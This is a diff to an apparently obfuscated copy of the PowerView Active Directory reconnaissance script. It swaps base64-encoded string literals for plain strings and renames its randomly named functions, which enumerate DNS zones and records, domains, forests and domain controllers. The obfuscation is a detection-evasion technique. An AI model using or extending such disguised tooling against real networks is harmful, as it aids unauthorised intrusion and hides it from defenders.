-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) {
+        if ($PSBoundParameters['Tombstone']) {
             $Searcher.Tombstone = $True
         }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
+        if ($PSBoundParameters['LDAPFilter']) {
             $Searcher.filter = $LDAPFilter
         }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) {
+        if ($PSBoundParameters['SecurityMasks']) {
             $Searcher.SecurityMasks = Switch ($SecurityMasks) {
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGFjbA=="))) { [System.DirectoryServices.SecurityMasks]::Dacl }
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA="))) { [System.DirectoryServices.SecurityMasks]::Group }
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ=="))) { [System.DirectoryServices.SecurityMasks]::None }
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXI="))) { [System.DirectoryServices.SecurityMasks]::Owner }
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FjbA=="))) { [System.DirectoryServices.SecurityMasks]::Sacl }
+                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
+                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
+                'None' { [System.DirectoryServices.SecurityMasks]::None }
+                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
+                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
             }
         }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
+        if ($PSBoundParameters['Properties']) {
             
-            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))) }
+            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
             $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
         }
 
@@ -2151,7 +2155,7 @@ function ltdynu {
 }
 
 
-function cbokhc {
+function ykrazp {
 
 
     [OutputType('System.Management.Automation.PSCustomObject')]
@@ -2163,7 +2167,7 @@ function cbokhc {
     )
 
     BEGIN {
-        function nafmxd {
+        function eljgwq {
             [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
             [CmdletBinding()]
             Param(
@@ -2182,7 +2186,7 @@ function cbokhc {
                 while ($SegmentLength-- -gt 0) {
                     $Name += [Char]$Raw[$Index++]
                 }
-                $Name += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+                $Name += "."
             }
             $Name
         }
@@ -2204,51 +2208,51 @@ function cbokhc {
             $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
         }
         else {
-            $TimeStamp = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W3N0YXRpY10=")))
+            $TimeStamp = '[static]'
         }
 
         $DNSRecordObject = New-Object PSObject
 
         if ($RDataType -eq 1) {
-            $IP = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9LnsxfS57Mn0uezN9"))) -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
+            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
             $Data = $IP
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QQ==")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
         }
 
         elseif ($RDataType -eq 2) {
-            $NSName = nafmxd $DNSRecord[24..$DNSRecord.length]
+            $NSName = eljgwq $DNSRecord[24..$DNSRecord.length]
             $Data = $NSName
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlM=")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
         }
 
         elseif ($RDataType -eq 5) {
-            $Alias = nafmxd $DNSRecord[24..$DNSRecord.length]
+            $Alias = eljgwq $DNSRecord[24..$DNSRecord.length]
             $Data = $Alias
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q05BTUU=")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
         }
 
         elseif ($RDataType -eq 6) {
             
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U09B")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
         }
 
         elseif ($RDataType -eq 12) {
-            $Ptr = nafmxd $DNSRecord[24..$DNSRecord.length]
+            $Ptr = eljgwq $DNSRecord[24..$DNSRecord.length]
             $Data = $Ptr
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UFRS")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
         }
 
         elseif ($RDataType -eq 13) {
             
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SElORk8=")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
         }
 
         elseif ($RDataType -eq 15) {
             
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TVg=")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
         }
 
         elseif ($RDataType -eq 16) {
@@ -2261,37 +2265,37 @@ function cbokhc {
             }
 
             $Data = $TXT
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFhU")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
         }
 
         elseif ($RDataType -eq 28) {
             
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QUFBQQ==")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
         }
 
         elseif ($RDataType -eq 33) {
             
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1JW")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
         }
 
         else {
             $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
-            $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVjb3JkVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VU5LTk9XTg==")))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
         }
 
-        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXBkYXRlZEF0U2VyaWFs"))) $UpdatedAtSerial
-        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFRM"))) $TTL
-        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWdl"))) $Age
-        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGltZVN0YW1w"))) $TimeStamp
-        $DNSRecordObject | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGF0YQ=="))) $Data
+        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
+        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
+        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
+        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
+        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
         $DNSRecordObject
     }
 }
 
 
-function qdrcic {
+function urjxmj {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -2331,57 +2335,57 @@ function qdrcic {
 
     PROCESS {
         $SearcherArguments = @{
-            'LDAPFilter' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENsYXNzPWRuc1pvbmUp")))
+            'LDAPFilter' = '(objectClass=dnsZone)'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $DNSSearcher1 = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $DNSSearcher1 = vydvzz @SearcherArguments
 
         if ($DNSSearcher1) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $DNSSearcher1.FindOne()  }
+            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }
             else { $Results = $DNSSearcher1.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
-                $Out = hfjsvm -Properties $_.Properties
-                $Out | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Wm9uZU5hbWU="))) $Out.name
-                $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkROU1pvbmU="))))
+                $Out = tsuvgg -Properties $_.Properties
+                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
+                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                 $Out
             }
 
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ERlNTaGFyZV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
+                    Write-Verbose ("[Get-DomainDFSShare] Error disposing of the Results object: {0}" -f $_)
                 }
             }
             $DNSSearcher1.dispose()
         }
 
-        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZVByZWZpeA==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049TWljcm9zb2Z0RE5TLERDPURvbWFpbkRuc1pvbmVz")))
-        $DNSSearcher2 = ltdynu @SearcherArguments
+        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
+        $DNSSearcher2 = vydvzz @SearcherArguments
 
         if ($DNSSearcher2) {
             try {
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $DNSSearcher2.FindOne() }
+                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }
                 else { $Results = $DNSSearcher2.FindAll() }
                 $Results | Where-Object {$_} | ForEach-Object {
-                    $Out = hfjsvm -Properties $_.Properties
-                    $Out | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Wm9uZU5hbWU="))) $Out.name
-                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkROU1pvbmU="))))
+                    $Out = tsuvgg -Properties $_.Properties
+                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
+                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                     $Out
                 }
                 if ($Results) {
                     try { $Results.dispose() }
                     catch {
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ETlNab25lXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiB7MH0="))) -f $_)
+                        Write-Verbose ("[Get-DomainDNSZone] Error disposing of the Results object: {0}" -f $_)
                     }
                 }
             }
             catch {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ETlNab25lXSBFcnJvciBhY2Nlc3NpbmcgJ0NOPU1pY3Jvc29mdEROUyxEQz1Eb21haW5EbnNab25lcw==")))
+                Write-Verbose "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
             }
             $DNSSearcher2.dispose()
         }
@@ -2389,7 +2393,7 @@ function qdrcic {
 }
 
 
-function ezqcku {
+function eigmyy {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -2412,7 +2416,7 @@ function ezqcku {
 
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $Properties = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmFtZSxkaXN0aW5ndWlzaGVkbmFtZSxkbnNyZWNvcmQsd2hlbmNyZWF0ZWQsd2hlbmNoYW5nZWQ="))),
+        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -2433,32 +2437,32 @@ function ezqcku {
 
     PROCESS {
         $SearcherArguments = @{
-            'LDAPFilter' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENsYXNzPWRuc05vZGUp")))
-            'SearchBasePrefix' = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9ezB9LENOPU1pY3Jvc29mdEROUyxEQz1Eb21haW5EbnNab25lcw=="))) -f $($ZoneName))
+            'LDAPFilter' = '(objectClass=dnsNode)'
+            'SearchBasePrefix' = ("DC={0},CN=MicrosoftDNS,DC=DomainDnsZones" -f $($ZoneName))
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $DNSSearcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $DNSSearcher = vydvzz @SearcherArguments
 
         if ($DNSSearcher) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $DNSSearcher.FindOne() }
+            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }
             else { $Results = $DNSSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
                 try {
-                    $Out = hfjsvm -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
-                    $Out | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Wm9uZU5hbWU="))) $ZoneName
+                    $Out = tsuvgg -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
+                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName
 
                     
                     if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                         
-                        $Record = cbokhc -DNSRecord $Out.dnsrecord[0]
+                        $Record = ykrazp -DNSRecord $Out.dnsrecord[0]
                     }
                     else {
-                        $Record = cbokhc -DNSRecord $Out.dnsrecord
+                        $Record = ykrazp -DNSRecord $Out.dnsrecord
                     }
 
                     if ($Record) {
@@ -2467,11 +2471,11 @@ function ezqcku {
                         }
                     }
 
-                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkROU1JlY29yZA=="))))
+                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                     $Out
                 }
                 catch {
-                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ETlNSZWNvcmRdIEVycm9yOiB7MH0="))) -f $_)
+                    Write-Warning ("[Get-DomainDNSRecord] Error: {0}" -f $_)
                     $Out
                 }
             }
@@ -2479,7 +2483,7 @@ function ezqcku {
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5ETlNSZWNvcmRdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6IHswfQ=="))) -f $_)
+                    Write-Verbose ("[Get-DomainDNSRecord] Error disposing of the Results object: {0}" -f $_)
                 }
             }
             $DNSSearcher.dispose()
@@ -2488,7 +2492,7 @@ function ezqcku {
 }
 
 
-function wjdyuo {
+function owdzhi {
 
 
     [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
@@ -2505,35 +2509,35 @@ function wjdyuo {
     )
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
+        if ($PSBoundParameters['Credential']) {
 
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LURvbWFpbg==")))
+            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
+            if ($PSBoundParameters['Domain']) {
                 $TargetDomain = $Domain
             }
             else {
                 
                 $TargetDomain = $Credential.GetNetworkCredential().Domain
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIEV4dHJhY3RlZCBkb21haW4gJyRUYXJnZXREb21haW4nIGZyb20gLUNyZWRlbnRpYWw=")))
+                Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
             }
 
-            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))), $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
 
             try {
                 [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIFRoZSBzcGVjaWZpZWQgZG9tYWluICckVGFyZ2V0RG9tYWluJyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3QsIG9yIHRoZSBzcGVjaWZpZWQgY3JlZGVudGlhbHMgYXJlIGludmFsaWQ6IHswfQ=="))) -f $_)
+                Write-Verbose ("[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: {0}" -f $_)
             }
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
-            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu"))), $Domain)
+        elseif ($PSBoundParameters['Domain']) {
+            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
             try {
                 [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIFRoZSBzcGVjaWZpZWQgZG9tYWluICckRG9tYWluJyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgb3IgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3QgOiB7MH0="))) -f $_)
+                Write-Verbose ("[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : {0}" -f $_)
             }
         }
         else {
@@ -2541,14 +2545,14 @@ function wjdyuo {
                 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5dIEVycm9yIHJldHJpZXZpbmcgdGhlIGN1cnJlbnQgZG9tYWluOiB7MH0="))) -f $_)
+                Write-Verbose ("[Get-Domain] Error retrieving the current domain: {0}" -f $_)
             }
         }
     }
 }
 
 
-function wrqkwt {
+function fbcyey {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -2575,19 +2579,19 @@ function wrqkwt {
 
     PROCESS {
         $Arguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA==")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
+        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
+            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }
 
             
-            $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKQ==")))
+            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
 
-            aglnim @Arguments
+            auxvef @Arguments
         }
         else {
-            $FoundDomain = wjdyuo @Arguments
+            $FoundDomain = owdzhi @Arguments
             if ($FoundDomain) {
                 $FoundDomain.DomainControllers
             }
@@ -2596,7 +2600,7 @@ function wrqkwt {
 }
 
 
-function ongcjs {
+function cgxtvt {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -2614,36 +2618,36 @@ function ongcjs {
     )
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
+        if ($PSBoundParameters['Credential']) {
 
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Gb3Jlc3RdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LUZvcmVzdA==")))
+            Write-Verbose "[Get-Forest] Using alternate credentials for Get-Forest"
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) {
+            if ($PSBoundParameters['Forest']) {
                 $TargetForest = $Forest
             }
             else {
                 
                 $TargetForest = $Credential.GetNetworkCredential().Domain
